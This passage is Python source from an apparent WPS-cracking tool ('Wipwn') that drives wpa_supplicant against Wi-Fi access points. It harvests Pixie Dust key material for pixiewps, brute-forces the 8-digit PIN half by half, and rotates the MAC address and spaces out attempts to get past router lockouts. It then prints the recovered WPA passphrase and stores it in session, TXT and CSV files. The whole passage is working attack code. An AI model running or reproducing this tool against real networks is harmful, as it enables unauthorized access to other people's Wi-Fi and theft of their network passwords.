        b4 = (mac_bytes[2] >> 4) & 0x0F
        b5 = mac_bytes[2] & 0x0F
        b6 = (mac_bytes[3] >> 4) & 0x0F
        b7 = mac_bytes[3] & 0x0F
        b8 = (mac_bytes[4] >> 4) & 0x0F
        b9 = mac_bytes[4] & 0x0F
        b10 = (mac_bytes[5] >> 4) & 0x0F
        b11 = mac_bytes[5] & 0x0F

        k1 = (b0 ^ b1 ^ b2 ^ b3) % 10
        k2 = (b4 ^ b5 ^ b6 ^ b7) % 10
        k3 = (b8 ^ b9 ^ b10 ^ b11) % 10
        k4 = (b0 + b1 + b2 + b3) % 10
        k5 = (b4 + b5 + b6 + b7) % 10
        k6 = (b8 + b9 + b10 + b11) % 10

        pin = k1 * 1000000 + k2 * 100000 + k3 * 10000 + k4 * 1000 + k5 * 100 + k6 * 10
        return pin

def recvuntil(pipe, what):
    s = ''
    while True:
        inp = pipe.stdout.read(1)
        if inp == '':
            return s
        s += inp
        if what in s:
            return s

def get_hex(line):
    a = line.split(':', 3)
    return a[2].replace(' ', '').upper()

class PixiewpsData:
    def __init__(self):
        self.pke = ''
        self.pkr = ''
        self.e_hash1 = ''
        self.e_hash2 = ''
        self.authkey = ''
        self.e_nonce = ''

    def clear(self):
        self.__init__()

    def got_all(self):
        return (self.pke and self.pkr and self.e_nonce and self.authkey
                and self.e_hash1 and self.e_hash2)

    def get_pixie_cmd(self, full_range=False):
        pixiecmd = "pixiewps --pke {} --pkr {} --e-hash1 {}"\
                    " --e-hash2 {} --authkey {} --e-nonce {}".format(
                    self.pke, self.pkr, self.e_hash1,
                    self.e_hash2, self.authkey, self.e_nonce)
        if full_range:
            pixiecmd += ' --force'
        return pixiecmd

class ConnectionStatus:
    def __init__(self):
        self.status = ''
        self.last_m_message = 0
        self.essid = ''
        self.wpa_psk = ''
        self.bssid = ''

    def isFirstHalfValid(self):
        return self.last_m_message > 5

    def clear(self):
        self.__init__()

class BruteforceStatus:
    def __init__(self):
        self.start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.mask = ''
        self.last_attempt_time = time.time()
        self.attempts_times = collections.deque(maxlen=15)

        self.counter = 0
        self.statistics_period = 5

    def display_status(self):
        average_pin_time = statistics.mean(self.attempts_times)
        if len(self.mask) == 4:
            percentage = int(self.mask) / 11000 * 100
        else:
            percentage = ((10000 / 11000) + (int(self.mask[4:]) / 11000)) * 100
        print(info + ' {:.2f}% complete @ {} ({:.2f} seconds/pin)'.format(
            percentage, self.start_time, average_pin_time))

    def registerAttempt(self, mask):
        self.mask = mask
        self.counter += 1
        current_time = time.time()
        self.attempts_times.append(current_time - self.last_attempt_time)
        self.last_attempt_time = current_time
        if self.counter == self.statistics_period:
            self.counter = 0
            self.display_status()

    def clear(self):
        self.__init__()

class Companion:
    """Main application part"""
    def __init__(self, interface, save_result=False, print_debug=False, advanced_options=None, vuln_list_file=None, add_to_vuln_list=False):
        self.interface = interface
        self.save_result = save_result
        self.print_debug = print_debug
        self.add_to_vuln_list = add_to_vuln_list

        self.advanced_options = advanced_options or {}
        self.delay = self.advanced_options.get('delay', 0)
        self.lock_delay = self.advanced_options.get('lock_delay', 60)
        self.timeout = self.advanced_options.get('timeout', 10)
        self.m57_timeout = self.advanced_options.get('m57_timeout', 0.40)
        self.fail_wait = self.advanced_options.get('fail_wait', 0)
        self.max_attempts = self.advanced_options.get('max_attempts', 0)
        self.ignore_locks = self.advanced_options.get('ignore_locks', False)
        self.nack_threshold = self.advanced_options.get('nack_threshold', 3)
        self.mac_changer = self.advanced_options.get('mac_changer', False)
        self.session_file = self.advanced_options.get('session', None)
        self.recurring_delay = self.advanced_options.get('recurring_delay', None)

        self.attack_stats = {
            'attempts': 0,
            'start_time': None,
            'consecutive_failures': 0,
            'consecutive_timeouts': 0,
            'consecutive_nacks': 0,
            'last_pin': None,
            'lock_detected': False
        }

        self.tempdir = tempfile.mkdtemp()
        with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
            temp.write('ctrl_interface={}\nctrl_interface_group=root\nupdate_config=1\n'.format(self.tempdir))
            self.tempconf = temp.name
        self.wpas_ctrl_path = f"{self.tempdir}/{interface}"
        self.__init_wpa_supplicant()

        with tempfile.NamedTemporaryFile(prefix='wpas_', suffix='.sock', delete=False) as sock_temp:
            self.res_socket_file = sock_temp.name

        if os.path.exists(self.res_socket_file):
            try:
                os.unlink(self.res_socket_file)
            except OSError:
                pass

        self.retsock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        try:
            self.retsock.bind(self.res_socket_file)
        except OSError as e:
            self.retsock.close()
            raise RuntimeError(f"Failed to bind socket at {self.res_socket_file}: {e}. Try killing previous instances or waiting a moment.")

        self.pixie_creds = PixiewpsData()
        self.connection_status = ConnectionStatus()

        user_home = str(pathlib.Path.home())
        self.sessions_dir = f'{user_home}/.Wipwn/sessions/'
        self.pixiewps_dir = f'{user_home}/.Wipwn/pixiewps/'
        self.reports_dir = os.path.dirname(os.path.realpath(__file__)) + '/reports/'
        if not os.path.exists(self.sessions_dir):
            os.makedirs(self.sessions_dir)
        if not os.path.exists(self.pixiewps_dir):
            os.makedirs(self.pixiewps_dir)

        self.storage_manager = StorageManager(self.sessions_dir, vuln_list_file)

        self.generator = WPSpin()

        atexit.register(self.cleanup)

    def __init_wpa_supplicant(self):
        print(f'{info} Running wpa_supplicant…')
        cmd = 'wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i{} -c{}'.format(self.interface, self.tempconf)
        self.wpas = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')

        while True:
            ret = self.wpas.poll()
            if ret is not None and ret != 0:
                raise ValueError('wpa_supplicant returned an error: ' + self.wpas.communicate()[0])
            if os.path.exists(self.wpas_ctrl_path):
                break
            time.sleep(.1)

    def sendOnly(self, command):
        """Sends command to wpa_supplicant"""
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)

    def sendAndReceive(self, command):
        """Sends command to wpa_supplicant and returns the reply"""
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)
        (b, address) = self.retsock.recvfrom(4096)
        inmsg = b.decode('utf-8', errors='replace')
        return inmsg

    @staticmethod
    def _explain_wpas_not_ok_status(command: str, respond: str):
        if command.startswith(('WPS_REG', 'WPS_PBC')):
            if respond == 'UNKNOWN COMMAND':
                return (f'{err} It looks like your wpa_supplicant is compiled without WPS protocol support. '
                        'Please build wpa_supplicant with WPS support ("CONFIG_WPS=y")')
        return f'{err} Something went wrong — check out debug log'

    def __handle_wpas(self, pixiemode=False, pbc_mode=False, verbose=None):
        if not verbose:
            verbose = self.print_debug
        if not self.wpas or not self.wpas.stdout:
            return False
        line = self.wpas.stdout.readline()
        if not line:
            self.wpas.wait()
            return False
        line = line.rstrip('\n')

        if verbose:
            sys.stderr.write(line + '\n')

        if line.startswith('WPS: '):
            if 'Building Message M' in line:
                n = int(line.split('Building Message M')[1].replace('D', ''))
                self.connection_status.last_m_message = n
                print(info + ' Sending WPS Message M{}…'.format(n))
            elif 'Received M' in line:
                n = int(line.split('Received M')[1])
                self.connection_status.last_m_message = n
                print(info + ' Received WPS Message M{}'.format(n))
                if n == 5:
                    print(f'{ok} The first half of the PIN is valid')
            elif 'Received WSC_NACK' in line:
                self.connection_status.status = 'WSC_NACK'
                print(f'{info} Received WSC NACK')
                print(f'{err} Error: wrong PIN code')
            elif 'Enrollee Nonce' in line and 'hexdump' in line:
                self.pixie_creds.e_nonce = get_hex(line)
                assert(len(self.pixie_creds.e_nonce) == 16*2)
                if pixiemode:
                    print(p_status + ' E-Nonce: {}'.format(self.pixie_creds.e_nonce))
            elif 'DH own Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pkr = get_hex(line)
                assert(len(self.pixie_creds.pkr) == 192*2)
                if pixiemode:
                    print(p_status + ' PKR: {}'.format(self.pixie_creds.pkr))
            elif 'DH peer Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pke = get_hex(line)
                assert(len(self.pixie_creds.pke) == 192*2)
                if pixiemode:
                    print(p_status + ' PKE: {}'.format(self.pixie_creds.pke))
            elif 'AuthKey' in line and 'hexdump' in line:
                self.pixie_creds.authkey = get_hex(line)
                assert(len(self.pixie_creds.authkey) == 32*2)
                if pixiemode:
                    print(p_status + ' AuthKey: {}'.format(self.pixie_creds.authkey))
            elif 'E-Hash1' in line and 'hexdump' in line:
                self.pixie_creds.e_hash1 = get_hex(line)
                assert(len(self.pixie_creds.e_hash1) == 32*2)
                if pixiemode:
                    print(p_status + ' E-Hash1: {}'.format(self.pixie_creds.e_hash1))
            elif 'E-Hash2' in line and 'hexdump' in line:
                self.pixie_creds.e_hash2 = get_hex(line)
                assert(len(self.pixie_creds.e_hash2) == 32*2)
                if pixiemode:
                    print(p_status + ' E-Hash2: {}'.format(self.pixie_creds.e_hash2))
            elif 'Network Key' in line and 'hexdump' in line:
                self.connection_status.status = 'GOT_PSK'
                self.connection_status.wpa_psk = bytes.fromhex(get_hex(line)).decode('utf-8', errors='replace')
        elif ': State: ' in line:
            if '-> SCANNING' in line:
                self.connection_status.status = 'scanning'
                print(f'{info} Scanning…')
        elif ('WPS-FAIL' in line) and (self.connection_status.status != ''):
            self.connection_status.status = 'WPS_FAIL'
            print(f'{err} wpa_supplicant returned WPS-FAIL')

        elif 'Trying to authenticate with' in line:
            self.connection_status.status = 'authenticating'
            if 'SSID' in line:
                self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
            print(f'{info} Authenticating…')
        elif 'Authentication response' in line:
            print(f'{ok} Authenticated')
        elif 'Trying to associate with' in line:
            self.connection_status.status = 'associating'
            if 'SSID' in line:
                self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
            print(f'{info} Associating with AP…')
        elif ('Associated with' in line) and (self.interface in line):
            bssid = line.split()[-1].upper()
            if self.connection_status.essid:
                print(ok + ' Associated with {} (ESSID: {}) '.format(bssid, self.connection_status.essid))
            else:
                print(ok + ' Associated with {}'.format(bssid))
        elif 'EAPOL: txStart' in line:
            self.connection_status.status = 'eapol_start'
            print(f'{info} Sending EAPOL Start…')
        elif 'EAP entering state IDENTITY' in line:
            print(f'{info} Received Identity Request')
        elif 'using real identity' in line:
            print(f'{info} Sending Identity Response…')
        elif pbc_mode and ('selected BSS ' in line):
            bssid = line.split('selected BSS ')[-1].split()[0].upper()
            self.connection_status.bssid = bssid
            print(info + ' Selected AP: {}'.format(bssid))

        return True

    def __runPixiewps(self, showcmd=False, full_range=False):
        print(f"{info} Running Pixiewps…")
        cmd = self.pixie_creds.get_pixie_cmd(full_range)
        if showcmd:
            print(cmd)
        r = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                           stderr=sys.stdout, encoding='utf-8', errors='replace')
        print(r.stdout)
        if r.returncode == 0:
            lines = r.stdout.splitlines()
            for line in lines:

                if '[+]' in line and 'WPS pin' in line:

                    import re
                    match = re.search(r'WPS pin[^:]*:\s*([\w\'\<>-]+)', line, re.IGNORECASE)
                    if match:
                        pin = match.group(1).strip()
                        if pin == '<empty>':
                            pin = "''"
                        print(f'{ok} Pixiewps found PIN: {pin}')
                        return pin
        print(f'{err} Failed to extract PIN from pixiewps output')
        return None

    def __credentialPrint(self, wps_pin=None, wpa_psk=None, essid=None):
        print(f"{ok} WPS PIN: '{wps_pin}'")
        print(f"{ok} WPA PSK: '{wpa_psk}'")
        print(f"{ok} AP SSID: '{essid}'")
        save_entry(
            ssid=essid,
            pin=wps_pin,
            psk=wpa_psk
        )

    def __saveResult(self, bssid, essid, wps_pin, wpa_psk):
        if not os.path.exists(self.reports_dir):
            os.makedirs(self.reports_dir)
        filename = self.reports_dir + 'stored'
        dateStr = datetime.now().strftime("%d.%m.%Y %H:%M")
        with open(filename + '.txt', 'a', encoding='utf-8') as file:
            file.write('{}\nBSSID: {}\nESSID: {}\nWPS PIN: {}\nWPA PSK: {}\n\n'.format(
                        dateStr, bssid, essid, wps_pin, wpa_psk
                    )
            )
        writeTableHeader = not os.path.isfile(filename + '.csv')
        with open(filename + '.csv', 'a', newline='', encoding='utf-8') as file:
            csvWriter = csv.writer(file, delimiter=';', quoting=csv.QUOTE_ALL)
            if writeTableHeader:
                csvWriter.writerow(['Date', 'BSSID', 'ESSID', 'WPS PIN', 'WPA PSK'])
            csvWriter.writerow([dateStr, bssid, essid, wps_pin, wpa_psk])

        self.storage_manager.save_cracked_network(bssid, essid, wps_pin, wpa_psk)

        if self.add_to_vuln_list:
            self.storage_manager.add_to_vuln_list(essid, bssid, essid)

        print(f'{info} Credentials saved to {filename}.txt, {filename}.csv')

    def __savePin(self, bssid, pin):
        filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
        with open(filename, 'w') as file:
            file.write(pin)
        print(info +' PIN saved in {}'.format(filename))

    def __prompt_wpspin(self, bssid):
        pins = self.generator.getSuggested(bssid)
        pin = None
        if len(pins) > 1:
            print(f'{info} PINs generated for {bssid}:')
            print('{:<3} {:<10} {:<}'.format('#', 'PIN', 'Name'))
            for i, pin_item in enumerate(pins):
                number = '{})'.format(i + 1)
                line = '{:<3} {:<10} {:<}'.format(
                    number, pin_item['pin'], pin_item['name'])
                print(line)
            while 1:
                pinNo = input(f'{ask} Select the PIN: ')
                try:
                    if int(pinNo) in range(1, len(pins)+1):
                        pin = pins[int(pinNo) - 1]['pin']
                    else:
                        raise IndexError
                except Exception:
                    print(f'{err} Invalid number')
                else:
                    break
        elif len(pins) == 1:
            pin_item = pins[0]
            print(info + ' The only probable PIN is selected:', pin_item['name'])
            pin = pin_item['pin']
        else:
            return None
        return pin

    def __wps_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, verbose=None):
        if not verbose:
            verbose = self.print_debug
        self.pixie_creds.clear()
        self.connection_status.clear()
        if self.wpas.stdout:
            self.wpas.stdout.read(300)
        if pbc_mode:
            if bssid:
                print(f"{info} Starting WPS push button connection to {bssid}…")
                cmd = f'WPS_PBC {bssid}'
            else:
                print(f"{info} Starting WPS push button connection…")
                cmd = 'WPS_PBC'
        else:
            print(f"{info} Trying PIN '{pin}'…")
            cmd = f'WPS_REG {bssid} {pin}'
        r = self.sendAndReceive(cmd)
        if 'OK' not in r:
            self.connection_status.status = 'WPS_FAIL'
            print(self._explain_wpas_not_ok_status(cmd, r))
            return False

        while True:
            res = self.__handle_wpas(pixiemode=pixiemode, pbc_mode=pbc_mode, verbose=verbose)
            if not res:
                break
            if self.connection_status.status == 'WSC_NACK':
                break
            elif self.connection_status.status == 'GOT_PSK':
                break
            elif self.connection_status.status == 'WPS_FAIL':
                break

        self.sendOnly('WPS_CANCEL')
        if self.connection_status.status == 'GOT_PSK':
            return True
        return False

    def single_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, showpixiecmd=False,
                          pixieforce=False, store_pin_on_fail=False):
        if not pin:
            if pixiemode:
                try:

                    if bssid:
                        filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
                        with open(filename, 'r') as file:
                            t_pin = file.readline().strip()
                            if input('[?] Use previously calculated PIN {}? [n/Y] '.format(t_pin)).lower() != 'n':
                                pin = t_pin
                            else:
                                raise FileNotFoundError
                    else:
                        raise FileNotFoundError
                except FileNotFoundError:
                    pin = self.generator.getLikely(bssid) or '12345670'
            elif not pbc_mode:

                pin = self.__prompt_wpspin(bssid) or '12345670' if bssid else '12345670'
        if pbc_mode:
            self.__wps_connection(bssid, pbc_mode=pbc_mode)
            bssid = self.connection_status.bssid
            pin = '<PBC mode>'
        elif store_pin_on_fail:
            try:
                self.__wps_connection(bssid, pin, pixiemode)
            except KeyboardInterrupt:
                print("\nAborting…")
                self.__savePin(bssid, pin)
                return False
        else:
            self.__wps_connection(bssid, pin, pixiemode)

        if self.connection_status.status == 'GOT_PSK':
            self.__credentialPrint(pin, self.connection_status.wpa_psk, self.connection_status.essid)
            if self.save_result:
                self.__saveResult(bssid, self.connection_status.essid, pin, self.connection_status.wpa_psk)
            if not pbc_mode and bssid:

                filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
                try:
                    os.remove(filename)
                except FileNotFoundError:
                    pass
            return True
        elif pixiemode:
            if self.pixie_creds.got_all():
                pin = self.__runPixiewps(showpixiecmd, pixieforce)
                if pin:
                    return self.single_connection(bssid, pin, pixiemode=False, store_pin_on_fail=True)
                return False
            else:
                print(f'{err} Not enough data to run Pixie Dust attack')
                return False
        else:
            if store_pin_on_fail:

                self.__savePin(bssid, pin)
            return False

    def __first_half_bruteforce(self, bssid, f_half, delay=None):
        """
        @f_half — 4-character string
        """
        checksum = self.generator.checksum
        while int(f_half) < 10000:

            if self.max_attempts > 0 and self.attack_stats['attempts'] >= self.max_attempts:
                print(f'{warn} Maximum attempts reached')
                return False

            t = int(f_half + '000')
            pin = '{}000{}'.format(f_half, checksum(t))

            self.attack_stats['attempts'] += 1
            self.attack_stats['last_pin'] = pin

            self.apply_delays()

            if self.mac_changer:
                self.change_mac_address()

            if self.attack_stats['attempts'] % 10 == 0:
                self.display_attack_progress(pin)

            self.single_connection(bssid, pin)

            if self.connection_status.isFirstHalfValid():
                print(f'{ok} First half found: {f_half}')
                self.attack_stats['consecutive_failures'] = 0
                return f_half
            elif self.connection_status.status == 'WSC_NACK':
                self.handle_attack_failure('nack')
                f_half = str(int(f_half) + 1).zfill(4)
                self.bruteforce.registerAttempt(f_half)
            elif self.connection_status.status == 'WPS_FAIL':
                self.handle_attack_failure('timeout')
                print(f'{err} WPS transaction failed, re-trying last pin')

            else:

                self.handle_attack_failure('timeout')
                f_half = str(int(f_half) + 1).zfill(4)
                self.bruteforce.registerAttempt(f_half)

            if self.attack_stats['attempts'] % 50 == 0:
                self.save_session(bssid, f_half + '000')

            if delay:
                time.sleep(delay)

        print(f'{err} First half not found')
        return False

    def __second_half_bruteforce(self, bssid, f_half, s_half, delay=None):
        """
        @f_half — 4-character string
        @s_half — 3-character string
        """
        checksum = self.generator.checksum
        while int(s_half) < 1000:

            if self.max_attempts > 0 and self.attack_stats['attempts'] >= self.max_attempts:
                print(f'{warn} Maximum attempts reached')
                return False

            t = int(f_half + s_half)
            pin = '{}{}{}'.format(f_half, s_half, checksum(t))

            self.attack_stats['attempts'] += 1
            self.attack_stats['last_pin'] = pin

            self.apply_delays()

            if self.mac_changer:
                self.change_mac_address()

            if self.attack_stats['attempts'] % 10 == 0:
                self.display_attack_progress(pin)

            self.single_connection(bssid, pin)

            if self.connection_status.last_m_message > 6:
                print(f'{ok} Complete PIN found: {pin}')
                self.attack_stats['consecutive_failures'] = 0
                return pin
            elif self.connection_status.status == 'WSC_NACK':
                self.handle_attack_failure('nack')
                s_half = str(int(s_half) + 1).zfill(3)
                self.bruteforce.registerAttempt(f_half + s_half)
            elif self.connection_status.status == 'WPS_FAIL':
                self.handle_attack_failure('timeout')
                print(f'{err} WPS transaction failed, re-trying last pin')

            else:

                self.handle_attack_failure('timeout')
                s_half = str(int(s_half) + 1).zfill(3)
                self.bruteforce.registerAttempt(f_half + s_half)

            if self.attack_stats['attempts'] % 50 == 0:
                self.save_session(bssid, f_half + s_half)

            if delay:
                time.sleep(delay)

        print(f'{err} Second half not found')
        return False

    def smart_bruteforce(self, bssid, start_pin=None, delay=None):

        self.attack_stats['start_time'] = time.time()
        self.attack_stats['attempts'] = 0

        session_data = self.load_session()
        if session_data and session_data.get('bssid') == bssid:
            mask = session_data.get('current_pin_index', '0000')
            self.attack_stats = session_data.get('statistics', self.attack_stats)
            print(f'{ok} Resuming from PIN: {mask}')
        elif (not start_pin) or (len(start_pin) < 4):

            try:
                filename = self.sessions_dir + '{}.run'.format(bssid.replace(':', '').upper())
                with open(filename, 'r') as file:
                    if input('[?] Restore previous session for {}? [n/Y] '.format(bssid)).lower() != 'n':
                        mask = file.readline().strip()
                    else:
                        raise FileNotFoundError
            except FileNotFoundError:
                mask = '0000'
        else:
            mask = start_pin[:7]

        try:
            self.bruteforce = BruteforceStatus()
            self.bruteforce.mask = mask

            if self.max_attempts > 0 and self.attack_stats['attempts'] >= self.max_attempts:
                print(f'{warn} Maximum attempts ({self.max_attempts}) reached')
                return False

            if len(mask) == 4:
                f_half = self.__first_half_bruteforce(bssid, mask, delay)
                if f_half and (self.connection_status.status != 'GOT_PSK'):
                    self.__second_half_bruteforce(bssid, f_half, '001', delay)
            elif len(mask) == 7:
                f_half = mask[:4]
                s_half = mask[4:]
                self.__second_half_bruteforce(bssid, f_half, s_half, delay)
            raise KeyboardInterrupt
        except KeyboardInterrupt:
            print("\nAborting…")

            filename = self.sessions_dir + '{}.run'.format(bssid.replace(':', '').upper())
            with open(filename, 'w') as file:
                file.write(self.bruteforce.mask)
            print('[i] Session saved in {}'.format(filename))

            self.save_session(bssid, self.bruteforce.mask)

            self.display_attack_progress(self.bruteforce.mask)

            if args.loop:
                raise KeyboardInterrupt

    def save_session(self, bssid, current_pin_index=None, pins_tried=None):
        """Save attack session state for resumption"""
        if not self.session_file:
            return

        session_data = {
            'bssid': bssid,
            'interface': self.interface,
            'timestamp': datetime.now().isoformat(),
            'attempts': self.attack_stats['attempts'],
            'current_pin_index': current_pin_index,
            'pins_tried': pins_tried or [],
            'last_pin': self.attack_stats.get('last_pin'),
            'statistics': self.attack_stats
        }

        try:
            import json
            with open(self.session_file, 'w') as f:
                json.dump(session_data, f, indent=2)
            if self.print_debug:
                print(f'{info} Session saved to {self.session_file}')
        except Exception as e:
            print(f'{warn} Failed to save session: {e}')

    def load_session(self):
        """Load saved attack session"""
        if not self.session_file or not os.path.exists(self.session_file):
            return None

        try:
            import json
            with open(self.session_file, 'r') as f:
                session_data = json.load(f)
            print(f'{ok} Loaded session from {self.session_file}')
            print(f'{info} Previous attempts: {session_data.get("attempts", 0)}')
            print(f'{info} Last PIN: {session_data.get("last_pin", "N/A")}')
            return session_data
        except Exception as e:
            print(f'{warn} Failed to load session: {e}')
            return None

    def change_mac_address(self):
        """Change MAC address (last octet) for each attempt"""
        if not self.mac_changer:
            return

        try:

            result = subprocess.run(['ip', 'link', 'show', self.interface],
                                  capture_output=True, text=True, check=True)
            current_mac = None
            for line in result.stdout.split('\n'):
                if 'link/ether' in line:
                    current_mac = line.split()[1]
                    break

            if not current_mac:
                return

            mac_parts = current_mac.split(':')
            last_octet = int(mac_parts[5], 16)

            last_octet = (last_octet + 1) % 254 + 1
            mac_parts[5] = f'{last_octet:02x}'
            new_mac = ':'.join(mac_parts)

            subprocess.run(['ip', 'link', 'set', self.interface, 'down'],
                         check=False, capture_output=True)
            subprocess.run(['ip', 'link', 'set', self.interface, 'address', new_mac],
                         check=False, capture_output=True)
            subprocess.run(['ip', 'link', 'set', self.interface, 'up'],
                         check=False, capture_output=True)

            print(f'{info} Changed MAC to: {new_mac}')
            time.sleep(1)
        except Exception as e:
            if self.print_debug:
                print(f'{warn} Failed to change MAC: {e}')

    def handle_attack_failure(self, failure_type='timeout'):
        """Handle various attack failure scenarios with adaptive logic"""
        self.attack_stats['consecutive_failures'] += 1

        if failure_type == 'timeout':
            self.attack_stats['consecutive_timeouts'] += 1
            if self.attack_stats['consecutive_timeouts'] >= 5:
                print(f'{warn} Multiple consecutive timeouts detected')
                print(f'{info} Increasing timeout to {self.timeout + 5}s')
                self.timeout += 5
                self.attack_stats['consecutive_timeouts'] = 0

        elif failure_type == 'nack':
            self.attack_stats['consecutive_nacks'] += 1
            if self.attack_stats['consecutive_nacks'] >= self.nack_threshold:
                print(f'{warn} Multiple NACKs received - PIN rejected')
                self.attack_stats['consecutive_nacks'] = 0

        elif failure_type == 'lock':
            self.attack_stats['lock_detected'] = True
            if not self.ignore_locks:
                print(f'{warn} AP has locked WPS - waiting {self.lock_delay}s')
                time.sleep(self.lock_delay)
                self.attack_stats['lock_detected'] = False
            else:
                print(f'{info} AP locked but ignore-locks enabled')

        if self.fail_wait > 0 and self.attack_stats['consecutive_failures'] >= 10:
            print(f'{info} Sleeping {self.fail_wait}s after {self.attack_stats["consecutive_failures"]} failures')
            time.sleep(self.fail_wait)
            self.attack_stats['consecutive_failures'] = 0

    def apply_delays(self):
        """Apply configured delays between attempts"""

        if self.delay > 0:
            time.sleep(self.delay)

        if self.recurring_delay:
            count, delay = self.recurring_delay
            if self.attack_stats['attempts'] > 0 and self.attack_stats['attempts'] % count == 0:
                print(f'{info} Recurring delay: sleeping {delay}s after {count} attempts')
                time.sleep(delay)

    def display_attack_progress(self, current_pin=None):
        """Display attack progress with statistics"""
        if not self.attack_stats['start_time']:
            self.attack_stats['start_time'] = time.time()

        elapsed = time.time() - self.attack_stats['start_time']
        rate = self.attack_stats['attempts'] / elapsed if elapsed > 0 else 0

        print(f'\n{info} Attack Progress:')
        print(f'  - Attempts: {self.attack_stats["attempts"]}')
        if current_pin:
            print(f'  - Current PIN: {current_pin}')
        print(f'  - Elapsed: {int(elapsed)}s')
        print(f'  - Rate: {rate:.2f} attempts/sec')
        if self.max_attempts > 0:
            remaining = self.max_attempts - self.attack_stats['attempts']
            print(f'  - Remaining: {remaining} attempts')

    def cleanup(self):
        """ Cleanup method to close resources and remove temporary files. """
        try:
            if hasattr(self, 'retsock') and self.retsock:
                self.retsock.close()
            if hasattr(self, 'wpas') and self.wpas:
                self.wpas.terminate()
            if os.path.exists(self.res_socket_file):
                os.remove(self.res_socket_file)
            if os.path.exists(self.tempdir):
                shutil.rmtree(self.tempdir, ignore_errors=True)
            if os.path.exists(self.tempconf):
                os.remove(self.tempconf)
        except Exception as e:
            print(f"Error during cleanup: {e}")

    def __del__(self):
        pass

class StorageManager:
    """Manage storage and track cracked networks in ~/.Wipwn/sessions/"""

    def __init__(self, session_dir=None, vuln_list_file=None):
        if session_dir is None:
            session_dir = os.path.expanduser('~/.Wipwn/sessions/')

        self.session_dir = session_dir
        self.vuln_list_file = vuln_list_file
        self.cracked_networks = {}
        self.load_all_sessions()

    def ensure_directory(self):
        """Create session directory if it doesn't exist"""
        try:
            os.makedirs(self.session_dir, exist_ok=True)
            return True
        except Exception as e:
            print(f"{warn} Failed to create session directory: {e}")
            return False

    def load_all_sessions(self):
        """Load all cracked networks from session files"""
        if not os.path.exists(self.session_dir):
            return

        try:
            for filename in os.listdir(self.session_dir):
                if filename.endswith('.json'):
                    filepath = os.path.join(self.session_dir, filename)
                    try:
                        with open(filepath, 'r') as f:
                            data = json.load(f)
                            if data.get('status') == 'cracked' or 'password' in data or 'psk' in data:
                                bssid = data.get('bssid', '').upper()
                                if bssid:
                                    self.cracked_networks[bssid] = {
                                        'timestamp': data.get('timestamp', ''),
                                        'pin': data.get('pin', ''),
                                        'password': data.get('password') or data.get('psk', ''),
                                        'status': data.get('status', 'success')
                                    }
                    except Exception as e:
                        pass
        except Exception as e:
            print(f"{warn} Failed to load sessions: {e}")

        self.load_from_legacy_stored_txt()

    def load_from_legacy_stored_txt(self):
        """Load cracked networks from old stored.txt format for backward compatibility"""

        reports_dir = os.path.dirname(os.path.realpath(__file__)) + '/reports/'
        stored_file = reports_dir + 'stored.txt'

        if not os.path.exists(stored_file):
            return

        try:
            with open(stored_file, 'r', encoding='utf-8', errors='replace') as f:
                lines = f.readlines()

            current_entry = {}
            for line in lines:
                line = line.strip()
                if not line:

                    if 'bssid' in current_entry:
                        bssid = current_entry['bssid'].upper()
                        self.cracked_networks[bssid] = {
                            'timestamp': current_entry.get('date', ''),
                            'pin': current_entry.get('pin', ''),
                            'password': current_entry.get('password', ''),
                            'essid': current_entry.get('essid', ''),
                            'status': 'legacy'
                        }
                    current_entry = {}
                elif line.startswith('BSSID:'):
                    current_entry['bssid'] = line.split(':', 1)[1].strip()
                elif line.startswith('ESSID:'):
                    current_entry['essid'] = line.split(':', 1)[1].strip()
                elif line.startswith('WPS PIN:'):
                    current_entry['pin'] = line.split(':', 1)[1].strip().strip("'")
                elif line.startswith('WPA PSK:'):
                    current_entry['password'] = line.split(':', 1)[1].strip().strip("'")
                else:

                    if '.' in line and ':' in line:
                        current_entry['date'] = line

        except Exception as e:
            pass

        self.load_from_legacy_stored_csv()

    def load_from_legacy_stored_csv(self):
        """Load cracked networks from old stored.csv format"""
        reports_dir = os.path.dirname(os.path.realpath(__file__)) + '/reports/'
        stored_csv = reports_dir + 'stored.csv'

        if not os.path.exists(stored_csv):
            return

        try:
            with open(stored_csv, 'r', encoding='utf-8', errors='replace') as f:
                for i, line in enumerate(f):
                    if i == 0:
                        continue
                    parts = line.strip().split(';')
                    if len(parts) >= 5:

                        bssid = parts[1].strip().strip("'")
                        if bssid and ':' in bssid:
                            self.cracked_networks[bssid.upper()] = {
                                'timestamp': parts[0].strip().strip("'"),
                                'essid': parts[2].strip().strip("'"),
                                'pin': parts[3].strip().strip("'"),
                                'password': parts[4].strip().strip("'"),
                                'status': 'legacy'
                            }
        except Exception as e:
            pass

    def is_cracked(self, bssid):
        """Check if network is already cracked"""
        if not bssid:
            return False
        return bssid.upper() in self.cracked_networks

    def save_cracked_network(self, bssid, essid, pin, password, status='cracked'):
        """Save successfully cracked network"""
        self.ensure_directory()

        try:

            filename = f"{bssid.replace(':', '')}.json"
            filepath = os.path.join(self.session_dir, filename)

            data = {
                'bssid': bssid.upper(),
                'essid': essid,
                'pin': pin,
                'password': password,
                'status': status,
                'timestamp': datetime.now().isoformat()
            }

            with open(filepath, 'w') as f:
                json.dump(data, f, indent=2)

            self.cracked_networks[bssid.upper()] = data
            print(f"{ok} Cracked network saved to session: {bssid}")
            return True
        except Exception as e:
            print(f"{warn} Failed to save cracked network: {e}")
            return False

    def get_cracked_info(self, bssid):
        """Get info about a cracked network"""
